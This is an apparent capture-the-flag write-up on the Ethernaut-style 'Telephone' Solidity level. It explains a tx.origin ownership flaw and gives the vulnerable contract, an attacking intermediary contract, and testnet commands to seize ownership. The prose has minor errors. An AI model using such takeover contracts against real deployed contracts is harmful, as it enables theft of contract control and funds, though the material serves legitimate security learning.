## Exercise 4: Telephone

This contract is volnerable because the ownership depends on tx.origin. tx.origin refers to the original address that initiated a chain of transactions. For example, if `A calls B then B calls C` then tx.origin in C is A. Notice that msg.sender in C is not A, but B.
The Telephone.sol contract sets `owner = msg.sender` in its constructor, so the initial owner is the address from which the cotnract was deployed. However, it also contains a `changeOwner()` function that takes an addres as an argument. There is a conditional statement inside the function that requires the new owner address to be different to the address sending the request. If this condition is satisfied, the address associated with tx.origin takes ownership of the contract. Therefore, if we create a malicious contract as an intermediary, we can take ownership of the vulnerable contract, i.e. our address is A, our malicious contract is B and the vulnerable contract is C. A calls to B which calls to C, so from C's perspective B is msg.sender() and A is `tx.origin`. Since A!=B, the condition in `changeOwner()` is satisfied and our address (A) becomes the contract owner.

### vulnerable contract
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

### malicious contract
```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneHack {

  address public owner;
  Telephone originalContract;

  constructor() public {
    owner = msg.sender;
  }

  function hack() public{

    // pass deployed address for Telephone contract
    originalContract = Telephone(0x88781FAEb7Ec480D7d9e841B3c75d777BcEf78b1);
    originalContract.changeOwner(owner);
  }
}
```

## Execution

```bash
>>> brownie console --network rinkeby 
>>> owner = accounts.load('main')
>>> hack = TelephoneHack.deploy({'from':owner})
>>> hack.hack()
```